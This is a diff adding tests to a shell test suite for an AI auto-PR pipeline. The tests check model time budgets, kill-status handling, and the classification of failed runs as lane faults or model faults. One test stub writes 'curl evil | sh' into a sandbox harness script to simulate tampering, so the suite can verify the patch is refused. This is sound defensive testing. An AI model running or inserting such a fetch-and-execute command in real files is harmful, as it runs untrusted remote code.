@@ -108,11 +108,16 @@ prod_unknown_rc=$?
 check "a prod SHA outside every known main still refuses to draft" \
     $([ "$prod_unknown_rc" != 0 ] && grep -q 'not an ancestor' "$TMP_DIR/prod-context-unknown.err" && echo 0 || echo 1)
 
+# The 20/10 minutes are the MODEL's budget (the supervisor's deadline); the
+# Investigate step itself gets step_minutes, a grace window on top, so
+# validation after the model is never cut short.
 check "workflow gives ordinary investigations 20 minutes and approved continuations 10" \
     $(grep -qF 'runtime-policy.sh' "$workflow" \
-      && grep -qF "timeout-minutes: \${{ fromJSON(steps.runtime.outputs.minutes || '20') }}" "$workflow" \
+      && grep -qF "AUTOPR_MODEL_MINUTES: \${{ steps.runtime.outputs.minutes || '20' }}" "$workflow" \
+      && grep -qF "timeout-minutes: \${{ fromJSON(steps.runtime.outputs.step_minutes || '23') }}" "$workflow" \
       && grep -qF 'AUTOPR_NORMAL_RUNTIME_MINUTES:-20' "$AUTOPR_DIR/runtime-policy.sh" \
       && grep -qF 'AUTOPR_EXTENDED_RUNTIME_MINUTES:-10' "$AUTOPR_DIR/runtime-policy.sh" \
+      && grep -qF 'AUTOPR_STEP_GRACE_MINUTES:-3' "$AUTOPR_DIR/runtime-policy.sh" \
       && echo 0 || echo 1)
 
 check "failed investigations checkpoint before the trusted checkout is reset" \
@@ -677,6 +682,8 @@ for argument in "$@"; do
     fi
     previous="$argument"
 done
+# A kill (the supervisor's model deadline, a signal): exit before writing anything.
+[ -z "${CODEX_STUB_EXIT:-}" ] || exit "$CODEX_STUB_EXIT"
 if [ "${CODEX_STUB_FAIL:-0}" = 1 ]; then
     printf 'Codex: simulated failure\n'
     exit 17
@@ -849,6 +856,29 @@ failed_codex_rc=$?
 check "live tee preserves a failing Codex exit status" \
     $([ "$failed_codex_rc" != 0 ] \
       && grep -q '\[FAILED\] Codex exited 17' "$TMP_DIR/live-failed.log" \
+      && echo 0 || echo 1)
+
+# The supervisor's model deadline reports 143. investigate.sh must pass a
+# status >= 128 through unchanged: checkpoint.sh reads it from the exit file
+# to tell a runtime-limited pause from a crash, and `die` would flatten it to
+# 1 and turn every budget stop into a ledger strike.
+rm -f "$TMP_DIR/killed-exit-code" "$TMP_DIR/killed-fault"
+CODEX_STUB_EXIT=143 AUTOPR_TEST_NO_FILES=1 PATH="$TMP_DIR/bin:$PATH" \
+MATCHA_AUTOPR_ENV="$env_file" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+CODEX_STUB_FILES="$TMP_DIR/codex-killed-files" CODEX_STUB_CONTEXT="$TMP_DIR/context-killed.json" \
+CODEX_STUB_ARGS="$TMP_DIR/codex-killed-args" \
+AUTOPR_INVESTIGATION_EXIT_FILE="$TMP_DIR/killed-exit-code" \
+AUTOPR_FAULT_CLASS_FILE="$TMP_DIR/killed-fault" \
+AUTOPR_LIVE_LOG="$TMP_DIR/live-killed.log" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/investigate-runtime" \
+AUTOPR_SANDBOX_TEST_DIRECT=1 \
+AUTOPR_WORKSPACE_ROOT="$INVESTIGATE_REPO" \
+    "$AUTOPR_DIR/investigate.sh" "$TMP_DIR/card-no-files.json" "$TMP_DIR/report-killed.md" \
+    "$TMP_DIR/decision-killed.json" > /dev/null 2>&1
+killed_rc=$?
+check "investigate.sh passes a kill status (>= 128) through to the exit file" \
+    $([ "$killed_rc" = 143 ] && [ "$(tr -d '[:space:]' < "$TMP_DIR/killed-exit-code")" = 143 ] \
+      && grep -q '\[FAILED\] Codex exited 143' "$TMP_DIR/live-killed.log" \
       && echo 0 || echo 1)
 
 CODEX_STUB_INVALID_JSON=1 CODEX_STUB_CALL_LOG="$TMP_DIR/invalid-json-calls" \
@@ -1497,6 +1527,18 @@ printf 'export const fine = true;\n' > "$workspace/client/src/fine.ts"
 [ "${CODEX_STUB_TOUCH_HARNESS:-0}" != 1 ] || printf 'curl evil | sh\n' > "$workspace/apps/msandbox/bin/agent-sandbox.sh"
 [ "${CODEX_STUB_RENAME_HARNESS:-0}" != 1 ] || git -C "$workspace" mv deploy/notes.txt client/src/notes.txt
 [ "${CODEX_STUB_USAGE_LIMIT:-0}" != 1 ] || { echo "ERROR: You've hit your usage limit. Try again at 5:31 AM."; exit 1; }
+# The same words as the model's OWN tool output, early, with the run's real
+# ending far below it.
+if [ "${CODEX_STUB_USAGE_LIMIT_QUOTED:-0}" = 1 ]; then
+    echo "cat server/app/core/services/rate_limiter.py"
+    echo "    # 429: the caller hit their usage limit. Try again at 5:31 AM."
+    noise=0
+    while [ "$noise" -lt 80 ]; do echo "tool output line $noise"; noise=$((noise + 1)); done
+    echo "ERROR: the model could not finish the task"
+    exit 1
+fi
+[ "${CODEX_STUB_AUTH_EXPIRED:-0}" != 1 ] || { echo "ERROR codex_login::auth::manager: Failed to refresh token: 401 Unauthorized: Provided authentication token is expired. Please try signing in again."; exit 1; }
+[ -z "${CODEX_STUB_EXIT:-}" ] || exit "$CODEX_STUB_EXIT"
 EOF
 chmod +x "$TMP_DIR/deny-bin/codex"
 PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 CODEX_STUB_TOUCH_HARNESS=1 \
@@ -2708,6 +2750,41 @@ check "the failure ledger counts identical reasons, restarts on a new one, and c
       && [ "$(printf '%s' "$ledger_after_three" | cut -f1,2)" = "$(printf '3\tdisallowed_paths_')" ] \
       && [ "$budget_cleared" = 0 ] && echo 0 || echo 1)
 
+# A lane-wide fault must cool the card down without striking it. `auth` is
+# held off by the dispatcher's login guard and `usage_limit` by
+# codex-backoff.sh, but `infrastructure` has no lane-wide hold at all: with
+# no marker written, select.sh's cooldown gate reads nothing and the same
+# card is re-selected every pass for as long as the fault stands.
+lane_task="eeeeeeee-0000-4000-8000-00000000000e"
+export AUTOPR_CACHE_DIR="$TMP_DIR/lane-fault-cache"
+autopr_mark_attempt "$lane_task"
+lane_ledger_path="$AUTOPR_CACHE_DIR/attempts/eeeeeeee"
+lane_cooldown_path="$lane_ledger_path.lane"
+lane_cools_down=$([ -f "$lane_cooldown_path" ] && [ ! -e "$lane_ledger_path" ] && echo 0 || echo 1)
+# The strike ledger is left ALONE — count and mtime. `touch`ing it moved the
+# card's last attempt past the owner's Run press, so select.sh's park gate
+# (human_signal_epoch <= attempt_epoch) held again and one lane-wide docker
+# outage re-parked a card a human had just released. No strike was added; the
+# human's reset was erased, which is the outcome this function exists to stop.
+autopr_record_outcome "$lane_task" failure verify
+autopr_record_outcome "$lane_task" failure verify
+touch -t 202601020000 "$lane_ledger_path"
+autopr_mark_attempt "$lane_task"
+lane_ledger="$(cut -f1,2 < "$lane_ledger_path")"
+lane_ledger_mtime="$(date -r "$lane_ledger_path" +%Y%m%d%H%M)"
+# Success clears both: nothing about the card, or about the lane, should hold
+# the next pass back.
+autopr_record_outcome "$lane_task" success
+lane_cleared=$([ ! -e "$lane_ledger_path" ] && [ ! -e "$lane_cooldown_path" ] && echo 0 || echo 1)
+unset AUTOPR_CACHE_DIR
+check "a lane-wide fault cools the card down without touching the strike ledger" \
+    $([ "$lane_cools_down" = 0 ] \
+      && [ "$lane_ledger" = "$(printf '2\tverify')" ] \
+      && [ "$lane_ledger_mtime" = 202601020000 ] \
+      && [ "$lane_cleared" = 0 ] \
+      && grep -qF 'mark_attempt "$task_id"' "$workflow" \
+      && echo 0 || echo 1)
+
 # Three identical failures with no human signal since: the pass holds the
 # card, notes why, asks the owner, and picks nothing.
 cat > "$TMP_DIR/budget-card.json" <<'EOF'
@@ -2766,6 +2843,35 @@ cooldown_rc=$?
 check "the cooldown still applies before the budget is consulted" \
     $([ "$cooldown_rc" = "3" ] && ! grep -q 'unqueue' "$TMP_DIR/park-urls" 2>/dev/null && echo 0 || echo 1)
 
+# The lane-fault marker is a SEPARATE file for this reason: with three strikes
+# already on the ledger and an owner's Run after them, a docker outage that
+# cools the card down must not re-park it. The cooldown reads the newer of the
+# two markers; the park gate reads the ledger alone.
+jq '.[0].autopr_reconsideration_at = "2026-01-03T00:00:00Z"' "$TMP_DIR/budget-card.json" \
+    > "$TMP_DIR/budget-released-card.json"
+printf '3\tverify\t2026-01-02T00:00:00Z\n' > "$TMP_DIR/budget-select-cache/attempts/dddddddd"
+touch -t 202601020000 "$TMP_DIR/budget-select-cache/attempts/dddddddd"
+AUTOPR_CACHE_DIR="$TMP_DIR/budget-select-cache" autopr_mark_attempt "dddddddd-0000-4000-8000-00000000000d"
+rm -f "$TMP_DIR/park-urls"
+PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_TEST_CURL_URLS="$TMP_DIR/park-urls" MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/budget-select-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/budget-released-card.json" >/dev/null 2>&1
+lane_cooldown_rc=$?
+# ...and once that cooldown has elapsed the card the human released runs.
+touch -t 202601020000 "$TMP_DIR/budget-select-cache/attempts/dddddddd.lane"
+rm -f "$TMP_DIR/park-urls"
+lane_released="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_TEST_CURL_URLS="$TMP_DIR/park-urls" MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/budget-select-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/budget-released-card.json" 2>/dev/null)"
+rm -f "$TMP_DIR/budget-select-cache/attempts/dddddddd.lane"
+check "a lane fault cools a released card down but never re-parks it" \
+    $([ "$lane_cooldown_rc" = "3" ] \
+      && ! grep -q 'unqueue' "$TMP_DIR/park-urls" 2>/dev/null \
+      && [ "$(printf '%s' "$lane_released" | jq -r '.id8 // empty')" = "dddddddd" ] \
+      && echo 0 || echo 1)
+
 ################################################################################
 # publish.sh and investigate.sh both `git reset --hard` $REPO_ROOT with no
 # pathspec. Without AUTOPR_WORKSPACE_ROOT that is the checkout they run from,
@@ -2789,6 +2895,182 @@ for guarded in publish.sh investigate.sh; do
             && printf '%s' "$guard_err" | grep -qF 'AUTOPR_WORKSPACE_ROOT is unset' \
             && [ -f "$GUARD_REPO/uncommitted.txt" ] && echo 0 || echo 1)
 done
+
+# Fault classes: why a failed model pass failed, from the bridge, so Cleanup
+# strikes the card's ledger only for the model's own failure. One evening of
+# expired login (2026-09-13 21:09Z) struck every card it touched.
+fault_file="$TMP_DIR/fault-class"
+write_codex_auth_fixture "$TMP_DIR/live-auth.json" "$(( $(date +%s) + 86400 ))"
+# Explicit, always: the transcript match is only a trigger now, and the
+# confirmation reads the host auth file. Unset, that is the operator's real
+# ~/.codex/auth.json.
+FAULT_AUTH_FILE="$TMP_DIR/expired-auth.json"
+run_bridge_for_fault() {
+  rm -f "$fault_file"
+  env "$@" PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 \
+    AUTOPR_FAULT_CLASS_FILE="$fault_file" \
+    AUTOPR_HOST_CODEX_AUTH_FILE="$FAULT_AUTH_FILE" \
+    AUTOPR_CODEX_BACKOFF_FILE="$TMP_DIR/fault-backoff.json" \
+    AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+    "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+    "$TMP_DIR/sandbox-report-fault.md" "$TMP_DIR/sandbox-decision-fault.json" \
+    -f "$TMP_DIR/sandbox-context.json" >"$TMP_DIR/sandbox-fault.log" 2>&1
+}
+run_bridge_for_fault CODEX_STUB_AUTH_EXPIRED=1; auth_rc=$?
+check "an expired login mid-run is classified auth, not the card's fault" \
+    $([ "$auth_rc" = 1 ] && [ "$(cat "$fault_file" 2>/dev/null)" = auth ] \
+      && grep -q '(auth)' "$TMP_DIR/sandbox-fault.log" && echo 0 || echo 1)
+rm -f "$TMP_DIR/fault-backoff.json"
+run_bridge_for_fault CODEX_STUB_USAGE_LIMIT=1; limit_rc=$?
+check "a usage-limit exit is classified usage_limit and still records the backoff" \
+    $([ "$limit_rc" = 1 ] && [ "$(cat "$fault_file" 2>/dev/null)" = usage_limit ] \
+      && [ -s "$TMP_DIR/fault-backoff.json" ] && echo 0 || echo 1)
+rm -f "$TMP_DIR/fault-backoff.json"
+# `usage_limit` has no machine state to probe, so its confirmation is
+# positional: the CLI prints its rate-limit error as the run dies, so only the
+# TAIL counts. Matched anywhere, a card whose work touches rate limiting both
+# escaped the strike ledger AND made codex-backoff.sh write the SHARED
+# usage-limit marker, grounding all three lanes for up to an hour.
+run_bridge_for_fault CODEX_STUB_USAGE_LIMIT_QUOTED=1; quoted_rc=$?
+check "a usage-limit string the model merely printed is the model's fault, and grounds no lane" \
+    $([ "$quoted_rc" = 1 ] && [ "$(cat "$fault_file" 2>/dev/null)" = model ] \
+      && [ ! -s "$TMP_DIR/fault-backoff.json" ] && echo 0 || echo 1)
+rm -f "$TMP_DIR/fault-backoff.json"
+# The transcript is the model's own output. With the host login demonstrably
+# ALIVE, the same 401 text is the model printing something it read — its own
+# failure, and a strike. Otherwise a card whose work touches auth code could
+# name itself a lane fault and never be struck.
+rm -f "$TMP_DIR/fault-backoff.json"
+FAULT_AUTH_FILE="$TMP_DIR/live-auth.json"
+run_bridge_for_fault CODEX_STUB_AUTH_EXPIRED=1; unconfirmed_rc=$?
+check "a 401 in the transcript with a live host login stays the model's fault" \
+    $([ "$unconfirmed_rc" = 1 ] && [ "$(cat "$fault_file" 2>/dev/null)" = model ] && echo 0 || echo 1)
+FAULT_AUTH_FILE="$TMP_DIR/expired-auth.json"
+rm -f "$TMP_DIR/fault-backoff.json"
+
+run_bridge_for_fault CODEX_STUB_TOUCH_HARNESS=1; touch_rc=$?
+check "a bridge refusal of the model's own patch is classified model" \
+    $([ "$touch_rc" != 0 ] && [ "$(cat "$fault_file" 2>/dev/null)" = model ] && echo 0 || echo 1)
+rm -f "$SANDBOX_TEST_REPO/apps/msandbox/bin/agent-sandbox.sh" "$SANDBOX_TEST_REPO/client/src/fine.ts"
+git -C "$SANDBOX_TEST_REPO" checkout -q -- . 2>/dev/null || true
+# Exit 75 is the operator-takeover code; without an acknowledged takeover it
+# is the model's own bad pause write. Classified from the INITIAL class it
+# read as `infrastructure`, so Cleanup booked no strike and the card could be
+# re-selected every cooldown window without ever reaching the three-strike
+# park.
+run_bridge_for_fault CODEX_STUB_EXIT=75; pause75_rc=$?
+check "exit 75 with no acknowledged takeover is the model's fault, not the lane's" \
+    $([ "$pause75_rc" != 0 ] && [ "$(cat "$fault_file" 2>/dev/null)" = model ] && echo 0 || echo 1)
+rm -f "$SANDBOX_TEST_REPO/client/src/fine.ts"
+git -C "$SANDBOX_TEST_REPO" checkout -q -- . 2>/dev/null || true
+
+run_bridge_for_fault; ok_rc=$?
+check "a successful pass leaves no fault class behind" \
+    $([ "$ok_rc" = 0 ] && [ ! -e "$fault_file" ] && echo 0 || echo 1)
+rm -f "$SANDBOX_TEST_REPO/client/src/fine.ts"
+git -C "$SANDBOX_TEST_REPO" checkout -q -- . 2>/dev/null || true
+
+# The budget is the STEP's total, not a per-pass allowance: a corrective
+# second pass with a fresh full deadline cannot fit inside minutes+grace, so
+# GitHub hard-kills the step mid-model — no container stop, no DEADLINE_EXIT,
+# no validation window (run 34728683748, the failure the grace was added for).
+check "each model pass gets what is left of the step's budget, not a fresh one" \
+    $(grep -qF 'MODEL_BUDGET_TOTAL_SECONDS="${AUTOPR_MODEL_BUDGET_SECONDS:-0}"' "$AUTOPR_DIR/investigate.sh" \
+      && grep -qF 'refresh_model_budget || true' "$AUTOPR_DIR/investigate.sh" \
+      && grep -qF 'if refresh_model_budget; then' "$AUTOPR_DIR/investigate.sh" \
+      && grep -qF 'remaining=$(( started + MODEL_BUDGET_TOTAL_SECONDS - now ))' "$AUTOPR_DIR/investigate.sh" \
+      && echo 0 || echo 1)
+
+# verify.sh always exits 0 — a failing branch is reported IN its table, never
+# as a status — so a Verify step failure is the step being killed by its
+# timeout or refusing to run here, both lane-wide. Striking the card for a
+# machine-speed timeout parked it after three passes.
+# The out-of-budget corrective park truncates report.md and decision.json.
+# Exiting 0 there made the workflow read a SUCCESSFUL investigation: Triage
+# jq'd an empty file (exit 0, empty output), publish.sh ran against an empty
+# report on a card the same branch had just parked, and a green job let
+# Cleanup's success branch delete the card's whole failure ledger.
+check "the out-of-budget corrective park fails the step, like its sibling path" \
+    $(awk '/if refresh_model_budget; then/,/^    fi$/' "$AUTOPR_DIR/investigate.sh" \
+        > "$TMP_DIR/budget-branch.txt" \
+      && grep -q 'die "not enough of the model budget was left' "$TMP_DIR/budget-branch.txt" \
+      && ! grep -qE '^[[:space:]]*exit 0[[:space:]]*$' "$TMP_DIR/budget-branch.txt" \
+      && echo 0 || echo 1)
+
+# ...and that `die` reaches Cleanup as a plain step failure, where the default
+# fault class is `model` — a strike. Running out of the STEP's clock is a lane
+# condition (a cold image, a slow clone, a long evidence pass), so three slow
+# days would have parked a card that never failed on its own merits, on top of
+# the [autopr:no-spec] park this same branch writes.
+check "running out of the step's clock is a lane fault, never a strike" \
+    $(grep -q 'note_fault_class budget' "$TMP_DIR/budget-branch.txt" \
+      && grep -qF 'auth|usage_limit|infrastructure|budget) run_reason=' "$workflow" \
+      && grep -qF "budget) printf 'OUT OF MODEL TIME'" "$AUTOPR_DIR/run-journal.sh" \
+      && echo 0 || echo 1)
+
+# The deadline handed to the supervisor is a RELATIVE duration, and
+# autopr_control.py starts counting when the supervisor launches — after the
+# auth preflight, the sandbox clone, a cold image pull and the container
+# start. Computed once at the top of the bridge, all of that was charged to
+# the step's grace window instead of to the model: a preflight longer than
+# AUTOPR_STEP_GRACE_MINUTES lets GitHub hard-kill the whole step first, which
+# is run 34728683748 again — no container stop, no DEADLINE_EXIT, no exit
+# >= 128, so checkpoint.sh reads a budget stop as a crash and the card is
+# struck for it.
+sed -n '/^model_budget_remaining()/,/^}/p' "$AUTOPR_DIR/run-codex-sandboxed.sh" \
+    > "$TMP_DIR/model-budget-fn.sh"
+# shellcheck source=/dev/null
+. "$TMP_DIR/model-budget-fn.sh"
+MODEL_BUDGET_SECONDS=600
+MODEL_BUDGET_MIN_SECONDS=30
+MODEL_BUDGET_START_EPOCH=$(( $(date +%s) - 400 ))
+budget_left="$(model_budget_remaining)"
+MODEL_BUDGET_START_EPOCH=$(( $(date +%s) - 5000 ))
+budget_elapsed="$(model_budget_remaining)"
+MODEL_BUDGET_SECONDS=0
+budget_unset="$(model_budget_remaining)"
+check "the model deadline is recomputed at launch, and an elapsed one never means 'no deadline'" \
+    $([ "$budget_left" -le 200 ] && [ "$budget_left" -ge 198 ] \
+      && [ "$budget_elapsed" = 30 ] && [ "$budget_unset" = 0 ] \
+      && grep -qF -- '--deadline "$(model_budget_remaining)"' "$AUTOPR_DIR/run-codex-sandboxed.sh" \
+      && echo 0 || echo 1)
+
+check "a verify failure is a lane fault and the step's cap fits real work" \
+    $(grep -qF 'run_reason=verify' "$workflow" \
+      && awk '/run_reason=verify/{found=1} found && /lane_fault=true/{print; exit}' "$workflow" | grep -q 'lane_fault=true' \
+      && [ "$(awk '/name: Verify \(baseline vs branch\)/,/^          "/' "$workflow" | grep -c 'timeout-minutes: 20')" = 1 ] \
+      && grep -qF 'VERIFY TIMED OUT' "$AUTOPR_DIR/run-journal.sh" \
+      && echo 0 || echo 1)
+
+# "Not the card's fault" must not collapse into "nothing is wrong". A
+# verify.sh that cannot start at all would otherwise re-burn a model pass on
+# every card forever behind a journal line saying nothing failed.
+check "a verify.sh that never started is named as a broken harness, not a timeout" \
+    $(grep -qF 'AUTOFIX_VERIFY_STARTED_FILE' "$REPO_ROOT/apps/msandbox/error-autofix/verify.sh" \
+      && grep -qF 'AUTOFIX_VERIFY_STARTED_FILE: ${{ runner.temp }}/verify-started' "$workflow" \
+      && grep -qF 'run_reason=verify_timeout' "$workflow" \
+      && grep -qF 'run_reason=verify_broken' "$workflow" \
+      && grep -qF 'VERIFY IS BROKEN ON THE RUNNER' "$AUTOPR_DIR/run-journal.sh" \
+      && echo 0 || echo 1)
+
+check "the model budget is the supervisor's deadline and the step keeps a grace window" \
+    $(grep -qF -- '--deadline "$(model_budget_remaining)"' "$AUTOPR_DIR/run-codex-sandboxed.sh" \
+      && grep -qF 'AUTOPR_MODEL_BUDGET_SECONDS=$((AUTOPR_MODEL_MINUTES * 60))' "$workflow" \
+      && grep -qF "timeout-minutes: \${{ fromJSON(steps.runtime.outputs.step_minutes || '23') }}" "$workflow" \
+      && grep -qF 'step_minutes' "$AUTOPR_DIR/runtime-policy.sh" \
+      && grep -qF 'DEADLINE_EXIT = 143' "$REPO_ROOT/apps/msandbox/cli/autopr_control.py" \
+      && echo 0 || echo 1)
+check "a runtime-limited pause is a green job and only a model fault strikes the ledger" \
+    $(grep -qF "steps.investigate.outcome != 'success' && steps.checkpoint.outputs.runtime_limited != 'true'" "$workflow" \
+      && grep -qF 'name: Park a runtime-limited investigation' "$workflow" \
+      && grep -qF 'FAULT_CLASS_FILE: ${{ runner.temp }}/investigation-fault-class' "$workflow" \
+      && grep -qF 'auth|usage_limit|infrastructure|budget) run_reason="$fault_class"; lane_fault=true ;;' "$workflow" \
+      && grep -qF 'if [ -n "$run_reason" ] && [ "$lane_fault" != true ]; then' "$workflow" \
+      && grep -qF 'auth) printf' "$AUTOPR_DIR/run-journal.sh" \
+      && grep -qF 'usage_limit) printf' "$AUTOPR_DIR/run-journal.sh" \
+      && grep -qF 'infrastructure) printf' "$AUTOPR_DIR/run-journal.sh" \
+      && echo 0 || echo 1)
 
 echo
 echo "$PASS passed, $FAIL failed"
